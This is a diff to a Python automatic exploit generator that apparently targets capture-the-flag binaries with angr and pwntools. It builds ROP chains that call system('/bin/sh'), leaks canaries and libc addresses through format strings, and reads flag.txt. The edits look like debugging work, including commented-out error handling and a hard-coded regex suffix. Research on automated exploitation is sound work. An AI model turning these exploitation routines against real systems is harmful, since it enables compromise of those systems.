@@ -10,7 +10,7 @@ from binascii import *
 
 # Disable angr logging and pwntools until we need it 
 logging.getLogger("angr").setLevel(logging.CRITICAL)
-#logging.getLogger("angr").setLevel(logging.DEBUG)
+logging.getLogger("angr").setLevel(logging.DEBUG)
 logging.getLogger("os").setLevel(logging.CRITICAL)
 logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
 
@@ -114,7 +114,7 @@ class rAEG:
                         ret = self.format_write(self.elf.sym['win'], self.elf.got[i], 'fmtstr')
                         if ret == 1:
                             break
-                    except:
+                    except KeyError:
                         ret = 0
             else:
                 self.format_leak()
@@ -254,11 +254,11 @@ class rAEG:
         self.proj.hook_symbol("printf", analyze_printf)
 
         logger.info("Symbolically analyzing the binary")
-        try:
-            self.simgr.explore(step_func=self.check_mem_corruption)
-        except ValueError:
-            logger.warning(f"Simulation unsatisfiable")
-            self.has_leak = True
+        #try:
+        self.simgr.explore(step_func=self.check_mem_corruption)
+        #except ValueError:
+            #logger.warning(f"Simulation unsatisfiable")
+            #self.has_leak = True
 
 
         for e in self.simgr.errored:
@@ -514,6 +514,7 @@ class rAEG:
 
         prompt = p.recvline()
 
+        print(hex(self.libc.sym["system"]))
 
         if b"0x" in prompt:
             self.leak = int(prompt.split(b":")[1].strip(b"\n"),16)
@@ -533,6 +534,7 @@ class rAEG:
 
 
         pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0] + self.libc.address)
+        pop_rsi = p64(r.find_gadget(["pop rsi", "pop r15", "ret"])[0] + self.libc.address)
         bin_sh = p64(next(self.libc.search(b"/bin/sh\x00")))
         #logger.info(f"Found pop rdi gadget in libc {hex(u64(pop_rdi))}")
         #logger.info(f"Found /bin/sh address in libc {hex(u64(bin_sh))}")
@@ -553,13 +555,16 @@ class rAEG:
         chain += p64(0) * 100
 
         #chain += pop_rdi + bin_sh
+        #chain += pop_rsi + p64(0) + p64(0)
         #chain += p64(self.elf.sym["_fini"])
         #chain += p64(self.libc.sym["system"])
+        #chain += p64(0)
 
         p.sendline(chain)
         p.sendline(b"cat flag.txt")
         try:
-            output = p.recvall(timeout=2)
+            output = p.recvall(timeout=40)
+            print(output)
             if b"flag" in output:
                 self.flag = b"flag{" + output.split(b"{")[1].replace(b" ", b"").replace(b"\n", b"").split(b"}")[0] + b"}"
                 self.flag = self.flag.decode()
@@ -617,7 +622,7 @@ class rAEG:
                         self.canary_offset_string = offset_str
                         logger.info(f"Found canary leak at offset {i}:{address}")
 
-                    libc_leak = re.search(r"0x7f[^f][a-f0-9]+", address)
+                    libc_leak = re.search(r"0x7f[^f][a-f0-9]+34a", address)
                     if libc_leak:
                         self.libc_offset_string = offset_str.split(".")[0]
                         self.has_libc_leak = True
@@ -817,7 +822,7 @@ class rAEG:
                 p.sendline(b"cat flag.txt")
                 p.sendline(b"cat flag.txt")
                 try:
-                    output = p.recvall(timeout=5).decode()
+                    output = p.recvall(timeout=1).decode()
                     self.flag = "flag{" + output.split("{")[1].split("}")[0] + "}"
                     print(self.flag)
                 except:
